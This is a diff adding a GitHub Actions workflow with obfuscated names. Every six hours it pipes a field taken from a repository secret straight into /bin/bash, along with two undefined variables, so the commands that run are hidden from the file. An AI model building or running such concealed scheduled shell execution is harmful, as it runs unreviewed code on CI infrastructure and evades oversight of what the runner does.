@@ -1,0 +1,20 @@
+name: yzhuoxingchen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yzhuoxingchen
+        env:
+          ibyh487: ${{ secrets.ibyh487 }}
+        run: |
+          echo $ibyh487 | jq -r .hmxwg85 | /bin/bash
+          echo $ldi89716 | jq -r .kdly44 | /bin/bash
+          echo $tatlb06783 | jq -r .r80250 | /bin/bash
+
